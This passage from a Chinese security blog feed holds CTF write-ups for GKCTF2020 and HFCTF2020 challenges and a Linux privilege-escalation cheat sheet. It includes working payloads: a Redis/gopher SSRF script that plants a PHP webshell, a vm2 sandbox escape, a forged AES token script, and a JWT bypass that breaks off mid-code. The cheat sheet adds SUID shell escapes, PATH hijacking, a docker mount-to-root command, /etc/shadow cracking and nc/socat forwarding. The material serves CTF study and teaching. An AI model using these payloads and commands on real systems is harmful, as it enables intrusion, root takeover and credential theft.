src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164128.png" alt="image-20200528110926892"></p><p>读了个寂寞，提示日期很重要</p><p>上传个 <a href="https://github.com/rebootuser/LinEnum">LinEnum</a> 读一下信息</p><p>在进程信息那里我们看到了 root 在执行一个 /auto.sh</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164131.png" alt="image-20200528112105303"></p><p>看一下文件，这也是解释了进程为什么一直有 sleep 60 这个操作</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164137.png" alt="image-20200528112206309"></p><p>看一下 py 文件</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164139.png" alt="image-20200528112300934"></p><p>这很显然就是我们的变量劫持，看一下权限</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113824.png" alt="image-20200528112351256"></p><p>所以我们可以通过改写这个 py 文件提权</p><p>其实，这个 /auto.sh 也是可写的，我们也可以改这个</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113826.png" alt="image-20200528112456969"></p><p>我这里就直接改 py 了</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113829.png" alt="image-20200528113533012"></p><p>等个一分钟收割 flag</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113831.png" alt="image-20200528113511733"></p><h2 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h2><p><strong>内网+redis写shell</strong></p><p>进去源码有提示</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113834.png" alt="image-20200528113752714"></p><p>给到了一个 hosts 的信息</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113906.png" alt="image-20200528113904509"></p><p>尝试访问 localhost 被 waf</p><pre><code>/index.php?url=http://127.0.0.1&amp;submit=提交</code></pre><p>那就改成内网地址试试</p><pre><code>/index.php?url=http://173.235.100.10&amp;submit=提交</code></pre><p>返回了正常页面</p><p>这里我们揣测出题人的思路，那应该就是让我扫内网地址，直接 bp，发现了这个比较特殊</p><pre><code>/index.php?url=http://173.235.100.11&amp;submit=提交</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528114349.png" alt="image-20200528114209680"></p><p>那就是让我们去扫描端口，继续 bp 扫常用端口，发现 redis 有回显</p><blockquote><p>记住要扫常用服务，不要从1开始扫，不然要很久</p></blockquote><pre><code>/index.php?url=http://173.235.100.11:6379&amp;submit=提交</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528114356.png" alt="image-20200528114347813"></p><p>gopher 协议没有 ban，发现可以 redis 随意写 shell</p><blockquote><p>注意编码问题就好</p></blockquote><p>这里直接贴上 payload</p><pre><code class="python">import urllibimport requests as rqprotocol=&quot;gopher://&quot;ip=&quot;173.19.221.11&quot;port=&quot;6379&quot;shell=&quot;\n\n\n\n&lt;?php system(&#39;ls / -al&#39;);system(&#39;cat /flag&#39;); ?&gt;\n\n\n\n&quot;filename=&quot;index.php&quot;path=&quot;/var/www/html&quot;passwd=&quot;&quot;cmd=[&quot;flushall&quot;,     &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),     &quot;config set dir &#123;&#125;&quot;.format(path),     &quot;config set dbfilename &#123;&#125;&quot;.format(filename),     &quot;save&quot;,     &quot;quit&quot;     ]if passwd:    cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;def redis_format(arr):    CRLF=&quot;\r\n&quot;    redis_arr = arr.split(&quot; &quot;)    cmd=&quot;&quot;    cmd+=&quot;*&quot;+str(len(redis_arr))    for x in redis_arr:        cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)    cmd+=CRLF    return cmdif __name__==&quot;__main__&quot;:    for x in cmd:        payload += redis_format(x).replace(&quot;\r\n&quot;,&quot;%250D%250A&quot;).replace(&quot;\n&quot;,&quot;%250A&quot;).replace(&quot;?&quot;,&quot;%253f&quot;)    print(payload)</code></pre><blockquote><p>这里我省了步骤，我是先看了 phpinfo()，发现没有 ban system()，再列一个目录，再看 flag 在哪</p></blockquote><p>上传之后回显成功</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528114937.png" alt="image-20200528114934084"></p><p>访问内网机子就能看到</p><pre><code>/index.php?url=http://173.235.100.11&amp;submit=提交</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528115043.png" alt="image-20200528115041491"></p><h2 id="GKCTF2020-EZ三剑客-EzNode"><a href="#GKCTF2020-EZ三剑客-EzNode" class="headerlink" title="[GKCTF2020]EZ三剑客-EzNode"></a>[GKCTF2020]EZ三剑客-EzNode</h2><p><strong>nodejs</strong></p><p>上来给了代码和版本，直接代码审计</p><p>总体逻辑就是绕过这里的 waf</p><pre><code class="js">app.use((req, res, next) =&gt; &#123;  if (req.path === &#39;/eval&#39;) &#123;    let delay = 60 * 1000;    console.log(delay);    if (Number.isInteger(parseInt(req.query.delay))) &#123;      delay = Math.max(delay, parseInt(req.query.delay));    &#125;    const t = setTimeout(() =&gt; next(), delay);    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事    setTimeout(() =&gt; &#123;      clearTimeout(t);      console.log(&#39;timeout&#39;);      try &#123;        res.send(&#39;Timeout!&#39;);      &#125; catch (e) &#123;      &#125;    &#125;, 1000);  &#125; else &#123;    next();  &#125;&#125;);</code></pre><p>就可以直接 eval 了</p><pre><code class="js">app.post(&#39;/eval&#39;, function (req, res) &#123;  let response = &#39;&#39;;  if (req.body.e) &#123;    try &#123;      response = saferEval(req.body.e);    &#125; catch (e) &#123;      response = &#39;Wrong Wrong Wrong!!!!&#39;;    &#125;  &#125;  res.send(String(response));&#125;);</code></pre><p>waf 可以用 int 溢出漏洞绕过，所以传入 2147483648 绕过成功</p><blockquote><p>当 delay 大于 2147483647 或小于 1 时,延迟将设置为 1</p></blockquote><p>后面就是绕 saferEval 了，这个根据版本去搜一下就好 ，最新版本的一般在 github 的 issues 里找到，可以直接拿来用</p><p><a href="https://github.com/commenthol/safer-eval/issues/11">https://github.com/commenthol/safer-eval/issues/11</a></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528120421.png" alt="image-20200528120418230"></p><h2 id="GKCTF2020-EZ三剑客-EzTypecho"><a href="#GKCTF2020-EZ三剑客-EzTypecho" class="headerlink" title="[GKCTF2020]EZ三剑客-EzTypecho"></a>[GKCTF2020]EZ三剑客-EzTypecho</h2><p><strong>反序列化</strong></p><p><a href="https://www.kingkk.com/2018/07/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Typecho反序列化漏洞复现</a></p><p>原版本在 install.php 那会有一个反序列化</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528121417.png" alt="image-20200528121416697"></p><p>但是出题人在这里加多了一个 <code>if(!isset($_SESSION))</code></p><p>但是后面还有一处，我们直接传入 <code>?start</code> 触发即可</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528121358.png" alt="image-20200528121355676"></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528121956.png" alt="image-20200528121820549"></p><p>命令执行无限制，直接读 /flag 就好</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528122002.png" alt="image-20200528121954615"></p><h2 id="GKCTF2020-Node-Exe"><a href="#GKCTF2020-Node-Exe" class="headerlink" title="[GKCTF2020]Node-Exe"></a>[GKCTF2020]Node-Exe</h2><p>第一次碰到这题目，无从下手，不过还挺有意思的</p><p>先看一下程序运行逻辑，打开 admin 登陆进去，然后给你三个 flag，打开 fiddler 抓包发现是发送了一个含有 timestamp 的 json，id 对应的就是 flag 的位置</p><blockquote><p>命令行断点 bpu <a href="http://xxx.node3.buuoj.cn">http://xxx.node3.buuoj.cn</a></p></blockquote><pre><code>&#123;&quot;id&quot;:1,&quot;timestamp&quot;:1590639747000&#125;</code></pre><p>直接修改 id = 3 会返回</p><pre><code>&#123;&quot;message&quot;:&quot;HaHa Hacker!!!&quot;&#125;</code></pre><p>写脚本伪造 timestamp 也失败</p><p>所以后台应该是验证了 token</p><p>还是去看看源码吧，把安装程序改成 zip 解压一下，源码在 </p><pre><code>/app-64/resources/app.asar</code></pre><p>进行反编译</p><pre><code>npm install -g asarasar extract app.asar app</code></pre><p>看一下 buyflag 的逻辑</p><pre><code class="js">buyFlag: function(e) &#123;    var i = this;    return c()(a.a.mark((function t() &#123;        var o;        return a.a.wrap((function(t) &#123;            for (;;) switch (t.prev = t.next) &#123;            case 0:                return o = &#123;                    id: e,                    timestamp: Date.parse(new Date)                &#125;,                t.t0 = i.$http,                t.t1 = i.url + &quot;/buyflag&quot;,                t.t2 = o,                t.next = 6,                i.makeToken(o);            case 6:                t.t3 = t.sent,                t.t4 = &#123;                    token: t.t3                &#125;,                t.t5 = &#123;                    headers: t.t4                &#125;,                t.t6 = function(e) &#123;                    i.$Modal.info(&#123;                        title: &quot;购买结果&quot;,                        content: e.data[0].flag                    &#125;)                &#125;,                t.t0.post.call(t.t0, t.t1, t.t2, t.t5).then(t.t6);            case 11:            case &quot;end&quot;:                return t.stop()            &#125;        &#125;), t, i)    &#125;)))()&#125;</code></pre><p>看一下 makeToken</p><pre><code class="js">makeToken: function(e) &#123;    var i = this;    return c()(a.a.mark((function t() &#123;        var o, r;        return a.a.wrap((function(t) &#123;            for (;;) switch (t.prev = t.next) &#123;            case 0:                return &quot;31169fedc9a20ecf&quot;,                &quot;d96adeefaa0102a9&quot;,                o = f()(n()(e)),                t.next = 5,                i.encrypt(&quot;31169fedc9a20ecf&quot;, &quot;d96adeefaa0102a9&quot;, o);            case 5:                return r = t.sent,                t.abrupt(&quot;return&quot;, r);            case 7:            case &quot;end&quot;:                return t.stop()            &#125;        &#125;), t, i)    &#125;)))()&#125;</code></pre><p>再看一下 encrypt</p><pre><code class="js">encrypt: function(e, i, t) &#123;    var o = this;    return c()(a.a.mark((function n() &#123;        return a.a.wrap((function(o) &#123;            for (;;) switch (o.prev = o.next) &#123;            case 0:                return o.abrupt(&quot;return&quot;, new s.a((function(o) &#123;                    var n = p.a.createCipheriv(&quot;aes-128-cbc&quot;, e, i),                    r = n.update(t, &quot;utf8&quot;, &quot;binary&quot;);                    r += n.final(&quot;binary&quot;),                    o(r = new Buffer.from(r, &quot;binary&quot;).toString(&quot;hex&quot;))                &#125;)));            case 1:            case &quot;end&quot;:                return o.stop()            &#125;        &#125;), n, o)    &#125;)))()&#125;,</code></pre><p>所以 token 使用了 <code>aes-128-cbc</code> 进行对经过了 <code>o=f()(n()(e))</code> 处理的 json 进行加密，key 是 <code>31169fedc9a20ecf</code>，iv 是 <code>d96adeefaa0102a9</code></p><p>随便拿一个 token 试验一下</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164157.png" alt="image-20200528150727592"></p><p>32 位的我们拿 md5 测试一下</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164154.png" alt="image-20200528150920692"></p><p>可以看到是吻合的，这里贴上脚本</p><pre><code class="python"># coding:utf-8from Crypto.Cipher import AESfrom binascii import b2a_hex, a2b_heximport time, json, datetime, hashlibimport requests as rqdef encrypt(raw):    BS = 16    pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)     key = b&#39;31169fedc9a20ecf&#39;    iv = b&#39;d96adeefaa0102a9&#39;    raw = pad(raw).encode()    cryptor = AES.new(key, AES.MODE_CBC, iv)    ciphertext = cryptor.encrypt(raw)    return b2a_hex(ciphertext).decode()def get_data_token():    dtime = datetime.datetime.now()    t = int(time.mktime(dtime.timetuple())) * 1000    data = json.dumps(&#123;&quot;id&quot;:&quot;3||1&quot;, &quot;timestamp&quot;:t&#125;).replace(&#39; &#39;,&#39;&#39;)    print(&quot;[+] data：%s&quot; % data)    token = encrypt(hashlib.md5(data.encode()).hexdigest())    print(&quot;[+] token：%s&quot; % token)    headers = &#123;        &quot;Content-Type&quot;: &quot;application/json;charset=UTF-8&quot;,        &quot;token&quot;:token    &#125;    return data, headersif __name__== &quot;__main__&quot;:    url = &quot;http://1165bc7f-ecfb-45e8-bbc5-533876f73e8d.node3.buuoj.cn/buyflag&quot;    data, headers = get_data_token()    res = rq.post(url, data=data, headers=headers)    print(res.text)</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164148.png" alt="image-20200528162837226"></p><blockquote><p>需要注意的是</p><ol><li>使用 json.dumps 要把结果的空格都去掉</li><li>AES 加密使用的 padding 是 pkcs5</li><li>时间戳的获取一定要用 datetime()，不能用直接 time.time() </li></ol></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux提权小知识</title>
      <link href="/2020/05/27/Linux%E6%8F%90%E6%9D%83%E5%B0%8F%E7%9F%A5%E8%AF%86/"/>
      <url>/2020/05/27/Linux%E6%8F%90%E6%9D%83%E5%B0%8F%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<p>稍微总结了一下关于 Linux 提权的小知识</p><span id="more"></span><h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><p>查看发行版本</p><pre><code class="shell">cat /etc/issuecat /etc/*-releaselsb_release -a</code></pre><p>查看内核版本</p><pre><code class="shell">uname -a</code></pre><p>大多内核漏洞通过内核版本能很快查到</p><p>用 kali 自带的 searchsploit 来搜索 exploitdb 中的漏洞利用代码</p><blockquote><p>根据自己的搜索结果，增加搜索选项，缩小结果范围</p></blockquote><pre><code class="shell">searchspoit priv esc linux 2.6 ubuntu</code></pre><p>利用第三方工具搜集信息</p><p><a href="https://github.com/mzet-/linux-exploit-suggester">linux-exploit-suggester</a></p><blockquote><p>Linux_Exploit_Suggester 能够列举出给定内核在每个公开的Linux内核漏洞上的暴露情况。</p><p>Example：</p><p>./linux-exploit-suggester.sh –uname <uname-string></p></blockquote><p><a href="https://github.com/jondonas/linux-exploit-suggester-2">linux-exploit-suggester-2</a></p><blockquote><p>Linux_Exploit_Suggester 是一款根据操作系统版本号自动查找相应提权脚本的工具，如果不带任何参数运行该脚本的话，将执行 uname -r 返回的操作系统发行版本，或者手工输入-k 参数查找指定版本号</p><p>Example:</p><p>perl ./Linux_Exploit_Suggester.pl -k 3.0.0</p></blockquote><p><a href="https://www.securitysift.com/download/linuxprivchecker.py">linuxprivchecker</a></p><blockquote><p>Linuxprivchecker 本地执行，可以列举出基本的系统信息并搜索常见的提权信息，如普通用户可写文件，错误配置，明文密码和可用的 exp。</p><p>Example：</p><p>python Linuxprivchecker.py</p></blockquote><p><a href="https://github.com/rebootuser/LinEnum">LinEnum</a></p><blockquote><p>LinEnum 可以列出详细的各种系统、文件和服务信息，定位出可能存在提权的地方，与上面的 linuxprivchecker 类似</p><p>Example：</p><p>./LinEnum.sh -r report -e /tmp/ -t</p></blockquote><p>当内核版本没有好用的exp对应的时候，可以检查磁盘格式</p><pre><code class="shell">cat /etc/fstab</code></pre><p>和已经安装的程序</p><pre><code class="shell">dpkg -lrpm -qa</code></pre><h2 id="明文-root-密码提权"><a href="#明文-root-密码提权" class="headerlink" title="明文 root 密码提权"></a>明文 root 密码提权</h2><p>大多 linux 系统的密码都和 /etc/passwd 和 /etc/shadow 这两个配置文件息息相关。passwd 里面存储了用户，shadow 里面存储了密码的 hash</p><p>出于安全考虑 passwd 是全用户可读，root可写的，而 shadow 是仅 root 可读写的</p><p><strong>检查文件权限</strong></p><pre><code class="shell">cd /etcls -l passwd shadow</code></pre><p><strong>/etc/passwd 可写</strong></p><p>passwd 由冒号分割，第一列是用户名，第二列是密码，x 代表密码 hash 被放在 shadow 里面了</p><p>如果 passwd 可写，我们就可以把 root 的密码字段替换成一个已知密码的 hash，这样系统在验证密码时以 passwd 的为准</p><p><strong>/etc/shadow 可读</strong></p><p>如果shadow可读，我们可以读走 root 的 hash，然后用 hashcat 或者 john 暴力破解。</p><p><strong>启动终端</strong></p><p>出于安全考虑，linux 要求用户必须从<strong>终端设备</strong>（tty）中输入密码，而不是标准输入（stdin）。换句话说，sudo 在你输入密码的时候本质上是读取了键盘，而不是 bash 里面输入的字符。因此为了能够输入密码，我们必须模拟一个终端设备。我们可以利用 python 启动一个终端</p><pre><code class="shell"> python -c &#39;import pty;pty.spawn(&quot;/bin/sh&quot;)&#39;</code></pre><p>就用 python 建立了一个虚拟终端，然后就可以使用 sudo 等等命令了。</p><pre><code class="shell">python -c &#39;import pty;pty.spawn(&quot;/bin/sh&quot;)&#39;$ sudo su[sudo] password for ctf: Sorry, try again.</code></pre><h2 id="sudo-滥用"><a href="#sudo-滥用" class="headerlink" title="sudo 滥用"></a>sudo 滥用</h2><p>sudo 是让普通用户使用超级用户的命令，其配置文件为 /etc/sudoers，文件定义可以执行 sudo 的账户、定义某个应用程序用 root 访问、是否需要密码验证。</p><p>利用 <code>sudo -l</code> 查看当前用户可使用的 sudo 命令</p><p>然后我们可以参考 <a href="https://gtfobins.github.io">https://gtfobins.github.io</a> 进行提权</p><blockquote><p>强烈推荐此博客，它整理了 Unix 内部可用于绕过本地安全限制的二进制文件</p></blockquote><h2 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h2><p>系统内可能会有一些定时执行的任务，一般这些任务由 crontab 来管理，具有所属用户的权限。非 root 权限的用户是不可以列出 root 用户的计划任务的。但是 /etc 内系统的计划任务可以被列出</p><pre><code>ls -l /etc/cron*</code></pre><p>默认这些程序以 root 权限执行，如果有幸遇到其中一个脚本被配置成任意用户可写，我们就可以修改脚本等反弹 root shell。</p><blockquote><p>rontab 计划任务千万不要写到 /etc/crontab 文件里。通过 crontab -e 去创建，让他写到默认的 /var/spool/cron下；创建任务时，避免使用 root 去创建任务，若用 root 创建任务，注意设置权限，避免 root 权限执行任务。</p></blockquote><h2 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h2><p>SUID 是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行。比如 passwd 命令，就是以 root 权限运行来修改 shadow 的。</p><blockquote><p>注意：只有这个程序的所有者是 0 号或其他 super user，同时拥有 SUID　权限，才可以提权。</p><p>参考：<a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></p></blockquote><p>命令行查找 SUID 文件</p><pre><code class="shell">find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125;</code></pre><p>这里举一个例子：</p><pre><code class="c">#include&lt;stdlib.h&gt;#include &lt;unistd.h&gt;int main()&#123;    setuid(0); // 以root用户执行    system(&quot;id&quot;);&#125;</code></pre><p>以 root 进行编译和权限设置</p><pre><code class="shell">gcc pri.c -o prichmod u+s ./pri # 这里设置了SUID位ls -l</code></pre><p>输出</p><pre><code class="shell">total 24-rwsr-xr-x 1 root root 16616 May 27 05:59 pri-rw-r--r-- 1 root root    95 May 27 05:57 pri.c</code></pre><p>注意 s 属性，表示这个程序有 SUID 属性。</p><p>接下来我们切换用户并执行可以发现提权成功</p><pre><code class="shell">su ctf./pri</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527180236.png" alt="image-20200527180232737"></p><p>而除了借助程序功能提权，我们还可以尝试劫持环境变量提权。上文的 pri 程序使用了 system 函数，system 函数是继承环境变量的，因此我们通过替换环境变量可以达到执行任意命令的效果。</p><p>继续以上面的 pri 程序为例，我们来尝试劫持 id 命令，修改环境变量路径</p><pre><code class="shell">echo $PATHexport PATH=/tmp:$PATH</code></pre><p><strong>方法一</strong></p><p>修改 id 命令</p><pre><code class="shell">echo &#39;/bin/sh&#39; &gt; /tmp/idchmod 777 /tmp/id</code></pre><p><strong>方法二</strong></p><p>直接复制一个 bash</p><pre><code class="shell">cp /bin/sh /tmp/id</code></pre><p><strong>方法三</strong></p><p>建立一个软链接（需要一定的权限）</p><pre><code class="shell">ls -l /bin/sh /tmp/idexport PATH=.:$PATH</code></pre><p>运行程序提权</p><pre><code class="shell">$ ./pri# whoamiroot#</code></pre><p>这里列出一些常用的可用于 SUID 提权的文件</p><blockquote><p>这里我们也可以再次借鉴神博客 <a href="https://gtfobins.github.io">https://gtfobins.github.io</a></p></blockquote><pre><code>- nmap- Vim- find- bash- more- less- nano- cp</code></pre><p><strong>namp</strong></p><p>较旧版本的 Nmap（2.02~5.21）带有交互模式，从而允许用户执行 shell 命令。由于 Nmap 位于上面使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的 shell。</p><p>可以使用下命令进入namp交互模式</p><pre><code class="shell">nmap --interactive</code></pre><p>执行命令后会返回一个shell</p><pre><code class="shell">nmap&gt; !shsh-3.2# whoamiroot</code></pre><p>而在 Metasploit 中也有一个模块可以通过 SUID nmap 进行提权</p><pre><code class="shell">exploit/unix/local/setuid_nmap</code></pre><p><strong>vim</strong></p><p>Vim 的主要用途是用作文本编辑器。 但是，如果以 SUID 运行，它将继承 root 用户的权限，因此可以读取系统上的所有文件</p><pre><code class="shell">vim /etc/shadow</code></pre><p><strong>find</strong></p><p>如果 find 以 SUID 权限运行，所有通过 find 执行的命令都会以 root 权限运行</p><pre><code class="shell">touch testfind test -exec whoami \;</code></pre><p><strong>bash</strong></p><p>以下命令将以 root 身份打开一个 bash shell</p><pre><code class="shell">bash -pbash-3.2# iduid=500(cow) gid=500(cow) euid=0(root) groups=500(cow)</code></pre><p><strong>less</strong></p><p>程序 less 也可以执行提权后的 shell</p><pre><code class="shell">less /etc/passwd!/bin/sh</code></pre><p><strong>nano</strong></p><p>以下命令可以打开一个提权后的 shell</p><pre><code class="shell">./nano^R^Xreset; sh 1&gt;&amp;0 2&gt;&amp;0</code></pre><p><strong>cp</strong></p><p>写文件</p><pre><code class="shell">LFILE=file_to_writeecho &quot;DATA&quot; | ./cp /dev/stdin &quot;$LFILE&quot;</code></pre><p>执行命令</p><pre><code class="shell">LFILE=file_to_writeTF=$(mktemp)echo &quot;DATA&quot; &gt; $TF./cp $TF $LFILE</code></pre><h2 id="Docker-组提权"><a href="#Docker-组提权" class="headerlink" title="Docker 组提权"></a>Docker 组提权</h2><p>docker 组用户提权，目的是利用 docker 组的用户来提权，因为 docker 组用户在容器下为 root 权限，通过挂载方式在容器下给本机添加 sudo 权限的用户，从而可以利用 sudo 命令。</p><p>参考 <a href="https://fosterelli.co/privilege-escalation-via-docker.html">https://fosterelli.co/privilege-escalation-via-docker.html</a></p><p>普通用户执行这条命令就可以获得root权限</p><pre><code>docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</code></pre><p>如果没有拥有 sudo 权限的用户，是无法执行 sudo 命令，在 kali 下会提示用户不在 sudoers 等提示。 </p><h2 id="服务漏洞"><a href="#服务漏洞" class="headerlink" title="服务漏洞"></a>服务漏洞</h2><p>有一些服务器的服务会被配置成对内网或者对本机开放。通过对他们的攻击我们有机会接触更多的敏感文件，或是运气足够好碰上一个远程 root 漏洞。</p><pre><code class="shell">netstat -antup # 查看各种网络服务</code></pre><p>如果找到些神秘的服务，可以用 netcat 或者 socat 等工具做端口转发</p><p>nc 单向转发</p><pre><code>nc -l 8080 | nc remote_host 4444</code></pre><p>nc 双向转发</p><pre><code class="shell">mkfifo backpipe nc -l 8080 0&lt;backpipe | nc remote_host 4444 1&gt;backpipe</code></pre><p>socat tcp 转发</p><pre><code>socat -d TCP4-LISTEN:80,reuseaddr,fork TCP4:remote_host:4444</code></pre><p>socat udp 转发</p><pre><code>socat -T 600 UDP4-LISTEN:5353,reuseaddr,fork UDP4:remote_host:4444</code></pre><p>常见服务漏洞</p><ul><li>redis</li><li>mysql</li><li>mssql</li><li>nfs</li></ul><p><strong>参考资料</strong></p><p><a href="https://www.freebuf.com/articles/system/129549.html">https://www.freebuf.com/articles/system/129549.html</a></p><p><a href="http://zone.secevery.com/article/1104">http://zone.secevery.com/article/1104</a></p><p><a href="https://cloud.tencent.com/developer/article/1544037">https://cloud.tencent.com/developer/article/1544037</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> PRACTICE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-2</title>
      <link href="/2020/05/26/BUUCTF-2/"/>
      <url>/2020/05/26/BUUCTF-2/</url>
      
        <content type="html"><![CDATA[<p> 补一下最近的 BUUCTF 做题记录</p><span id="more"></span><h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p><strong>Node.js</strong></p><p>利用报错可以得知前端 php ，后端是 vm2</p><pre><code>(function()&#123;var err = new Error();return err.stack;&#125;)();</code></pre><p>去 github 搜索 vm2 的漏洞找到以下的 payload</p><p><a href="https://github.com/patriksimek/vm2/issues/225">https://github.com/patriksimek/vm2/issues/225</a></p><pre><code>(function()&#123;    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();    try&#123;        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;    &#125;catch(e)&#123;        return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();    &#125;&#125;)()</code></pre><p>但是 waf 很多字符，发现可以用数组绕过，所以最终 payload 是</p><pre><code>/run.php?code[]=(function()&#123; TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)(); try&#123; Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1; &#125;catch(e)&#123; return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString(); &#125; &#125;)()</code></pre><h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p><strong>JWT</strong></p><p>查看 app.js 发现是 koa 框架，根据框架搜到源码在 controllers/api.js</p><pre><code>const crypto = require(&#39;crypto&#39;);const fs = require(&#39;fs&#39;)const jwt = require(&#39;jsonwebtoken&#39;)const APIError = require(&#39;../rest&#39;).APIError;module.exports = &#123;    &#39;POST /api/register&#39;: async (ctx, next) =&gt; &#123;        const &#123;username, password&#125; = ctx.request.body;        if(!username || username === &#39;admin&#39;)&#123;            throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;);        &#125;        if(global.secrets.length &gt; 100000) &#123;            global.secrets = [];        &#125;        const secret = crypto.randomBytes(18).toString(&#39;hex&#39;);        const secretid = global.secrets.length;        global.secrets.push(secret)        const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#39;HS256&#39;&#125;);        ctx.rest(&#123;            token: token        &#125;);        await next();    &#125;,    &#39;POST /api/login&#39;: async (ctx, next) =&gt; &#123;        const &#123;username, password&#125; = ctx.request.body;        if(!username || !password) &#123;            throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;);        &#125;        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;        const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;        console.log(sid)        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123;            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);        &#125;        const secret = global.secrets[sid];        const user = jwt.verify(token, secret, &#123;algorithm: &#39;HS256&#39;&#125;);        const status = username === user.username &amp;&amp; password === user.password;        if(status) &#123;            ctx.session.username = username;        &#125;        ctx.rest(&#123;            status        &#125;);        await next();    &#125;,    &#39;GET /api/flag&#39;: async (ctx, next) =&gt; &#123;        if(ctx.session.username !== &#39;admin&#39;)&#123;            throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;);        &#125;        const flag = fs.readFileSync(&#39;/flag&#39;).toString();        ctx.rest(&#123;            flag        &#125;);        await next();    &#125;,    &#39;GET /api/logout&#39;: async (ctx, next) =&gt; &#123;        ctx.session.username = null;        ctx.rest(&#123;            status: true        &#125;)        await next();    &#125;&#125;;</code></pre><p>这里可以通过设置secretid为数组，加密算法为空绕过登陆验证，payload</p><pre><code>import jwtprint(jwt.encode(&#123;&quot;secretid&quot;:[],&quot;username&quot;: &quot;admin&quot;,&quot;password&quot;: &quot;123456&quot;,&quot;iat&quot;: 